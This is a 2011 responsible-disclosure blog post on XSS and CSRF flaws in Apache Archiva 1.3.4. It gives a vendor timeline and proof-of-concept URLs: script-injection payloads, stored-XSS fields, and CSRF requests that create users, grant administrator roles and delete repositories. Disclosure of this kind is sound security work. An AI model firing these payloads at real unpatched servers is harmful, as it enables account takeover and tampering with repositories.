---
title: "Apache Archiva Multiple XSS & CSRF Vulnerabilities"
date: 2011-05-30
categories:
- security research
- appsec
- apache archiva
tags:
- xss
- csrf

thumbnailImagePosition: left
thumbnailImage: /img/apache-archiva-multiple-xss-&-csrf-vulnerabilities/1.png
---

Multiple XSS and CSRF issues in Apache Archiva version 1.3.4. Disclosure blogpost.

<!--more-->


## Background

When playing around with an installation of Apache Archiva (v1.3.4), I discovered multiple XSS and CSRF issues with the product. I reported these to the vendor and participated in responsible disclosure. This post describes the proof of concept codes and timelines.

**Overview**

```
Project: Apache Archiva
Severity: High
Versions: 1.3.0 – 1.3.4. The unsupported versions Archiva 1.0 - 1.2.2 are also affected.
Exploit type: Multiple XSS & CSRF
Mitigation: Archiva 1.3.4 and earlier users should upgrade to 1.3.5
Vendor URL: http://archiva.apache.org/security.html
CVE: CVE-ID-2011-1077, CVE-2011-1026
```

**Timeline**

```
28 February 2011: Vendor Contacted
1 March 2011: Vendor Response received. CVE-2011-1026 for CSRF Issues Assigned.
7 March 2011: CVE-2011-1077 Assigned for XSS Issues.
14 March 2011: Fixes released to selected channels / Found to be insufficient
27 May 2011: Vendor releases v1.3.5
27 May 2011: Vendor releases security disclosure to Bugtraq and FD.
30 May 2011: Exploit details released on Bugtraq & FD
```

## Product Description

Apache Archiva is an extensible repository management software that helps taking care of your own personal or enterprise-wide build artifact repository. It is the perfect companion for build tools such as Maven, Continuum, and ANT.

Archiva offers several capabilities, amongst which remote repository proxying, security access management, build artifact storage, delivery, browsing, indexing and usage reporting, extensible scanning functionality... and many more! (Source: http://archiva.apache.org/)

## Vulnerability Details

**XSS:** User can insert HTML or execute arbitrary JavaScript code within the vulnerable application. The vulnerabilities arise due to insufficient input validation in multiple input fields throughout the application.

Successful exploitation of these vulnerabilities could result in, but not limited to, compromise of the application, theft of
cookie-based authentication credentials, arbitrary url redirection, disclosure or modification of sensitive data and phishing attacks.

**CSRF:** These issues allow an attacker to access and use the application with the session of a logged on user. In this case if an administrative account is exploited, total application compromise may be acheived.

An attacker can build a simple html page containing a hidden Image tag (eg: `<img src="vulnurl" width="0" height="0">`) and entice the administrator to access the page.

## Proof of Concept

### Reflected XSS


- `http://example.com/archiva/security/useredit.action?username=test%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E`

- `http://example.com/archiva/security/roleedit.action?name=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E`

- `http://example.com/archiva/security/userlist!show.action?roleName=test%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E`

- `http://example.com/archiva/deleteArtifact!doDelete.action?groupId=1<script>alert('xss')</script>&artifactId=1<script>alert('xss')</script>&version=1&repositoryId=internal`

- `http://example.com/archiva/admin/addLegacyArtifactPath!commit.action?legacyArtifactPath.path=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&groupId=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&artifactId=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&version=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3Eclassifier=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3Etype=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E`

- `http://example.com/archiva/admin/deleteNetworkProxy!confirm.action?proxyid=test%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E`


### Stored XSS

- Exploit code: `test<script>alert('xss')</script>`

#### Case 1

* Store URL: `http://example.com/archiva/admin/addRepository.action`
* Vars: `Identifier:repository.id, Name:repository.name,Directory:repository.location, Index Directory:repository.indexDir`
* Execute URL: `http://example.com/archiva/admin/confirmDeleteRepository.action?repoid=`

#### Case 2

* Store URL: `http://example.com/archiva/admin/editAppearance.action`
* Vars: `Name:organisationName, URL:organisation:URL, LogoURL:organisation:URL`
* Execute URL: `http://example.com/archiva/admin/configureAppearance.action`

#### Case 3

* Store URL: `http://example.com/archiva/admin/addLegacyArtifactPath.action`
* Vars: `Path:name=legacyArtifactPath.path, GroupId:groupId, ArtifactId:artifactId, Version:version, Classifier:classifier, Type:type`
* Execute URL: `http://example.com/archiva/admin/legacyArtifactPath.action`

#### Case 4

* Store URL: `http://example.com/archiva/admin/addNetworkProxy.action`
* Vars: `Identifier:proxy.id, Protocol:proxy.protocol, Hostname:proxy.host, Port:proxy.port, Username:proxy.username`
* Execute URL: `http://example.com/archiva/admin/networkProxies.action`


### CSRF

- `http://example.com/archiva/security/usercreate!submit.action?user.username=tester123&user.fullName=test&user.email=test%40test.com&user.password=abc&user.confirmPassword=abc`

- `http://example.com/archiva/security/userdelete!submit.action?username=test`

- `http://example.com/archiva/security/addRolesToUser.action?principal=test&addRolesButton=true&__checkbox_addNDSelectedRoles=Guest&__checkbox_addNDSelectedRoles=Registered+User&addNDSelectedRoles=System+Administrator&__checkbox_addNDSelectedRoles=System+Administrator&__checkbox_addNDSelectedRoles=User+Administrator&__checkbox_addNDSelectedRoles=Global+Repository+Manager&__checkbox_addNDSelectedRoles=Global+Repository+Observer&submitRolesButton=Submit`

- `http://example.com/archiva/admin/deleteRepository.action?repoid=test&method%3AdeleteContents=Delete+Configuration+and+Contents`

- `http://example.com/archiva/deleteArtifact!doDelete.action?groupId=1&artifactId=1&version=1&repositoryId=snapshots`

- `http://example.com/archiva/admin/addRepositoryGroup.action?repositoryGroup.id=csrfgrp`

- `http://example.com/archiva/admin/deleteRepositoryGroup.action?repoGroupId=test&method%3Adelete=Confirm`

- `http://example.com/archiva/admin/disableProxyConnector!disable.action?target=maven2-repository.dev.java.net&source=internal`

- `http://example.com/archiva/admin/deleteProxyConnector!delete.action?target=maven2-repository.dev.java.net&source=snapshots`

- `http://example.com/archiva/admin/deleteLegacyArtifactPath.action?path=jaxen/jars/jaxen-1.0-FCS-full.jar`

- `http://example.com/archiva/admin/saveNetworkProxy.action?mode=add&proxy.id=ntwrk&proxy.protocol=http&proxy.host=test&proxy.port=8080&proxy.username=&proxy.password=`

- `http://example.com/archiva/admin/deleteNetworkProxy!delete.action?proxyid=myproxy`

- `http://example.com/archiva/admin/repositoryScanning!addFiletypePattern.action?pattern=**/*.rum&fileTypeId=artifacts`

- `http://example.com/archiva/admin/repositoryScanning!removeFiletypePattern.action?pattern=**/*.rum&fileTypeId=artifacts`

- `http://example.com/archiva/admin/repositoryScanning!updateKnownConsumers.action?enabledKnownContentConsumers=auto-remove&enabledKnownContentConsumers=auto-rename&enabledKnownContentConsumers=create-missing-checksums&enabledKnownContentConsumers=index-content&enabledKnownContentConsumers=metadata-updater&enabledKnownContentConsumers=repository-purge&enabledKnownContentConsumers=update-db-artifact&enabledKnownContentConsumers=validate-checksums`

- `http://example.com/archiva/admin/database!updateUnprocessedConsumers.action?enabledUnprocessedConsumers=update-db-project`

- `http://example.com/archiva/admin/database!updateCleanupConsumers.action?enabledCleanupConsumers=not-present-remove-db-artifact&enabledCleanupConsumers=not-present-remove-db-project&enabledCleanupConsumers=not-present-remove-indexed`

---